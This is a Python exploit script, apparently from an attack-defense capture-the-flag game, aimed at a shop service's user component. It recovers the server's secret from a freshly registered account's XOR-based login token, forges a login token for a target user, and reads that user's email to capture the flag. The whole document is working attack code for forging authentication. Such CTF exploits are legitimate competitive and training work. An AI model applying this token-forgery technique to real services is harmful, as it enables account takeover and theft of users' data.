#!/usr/bin/env python3

class config:
    service = "Pwnzer0tt1Shop-User"
    #CHANGE ME!!!!
    team_token = "token"
    my_team_ip = "10.60.team_id.1"

#Write your attack here

import math, secrets
from _pwnshop_utils import PwnShopClient

#TAKEN FROM SOURCE CODE
def create_token(text: str, secret: bytes) -> str:
    token_len = len(secret)
    text = (text * math.ceil(token_len / len(text)))[:token_len]
    result = bytes([ord(a) ^ ord(b) for a, b in zip(secret, text)])
    return result.hex()

def calc_secret(username: str, token: str):
    token = bytes.fromhex(token)
    token_len = len(token)
    username = (username * math.ceil(token_len / len(username)))[:token_len]
    result = bytes([ord(a) ^ b for a, b in zip(username, token)])
    return result.decode()

def attack(team_ip: str, flag_id):
    client = PwnShopClient(team_ip)
    user = client.register_user(secrets.token_hex(10), secrets.token_hex(10), secrets.token_hex(10))
    generated_token = user["token"]
    username_generated = user["username"]
    secret_token = calc_secret(username_generated, generated_token)
    client.logout_user()
    return client.token_login(create_token(flag_id["username"], secret_token))["email"]
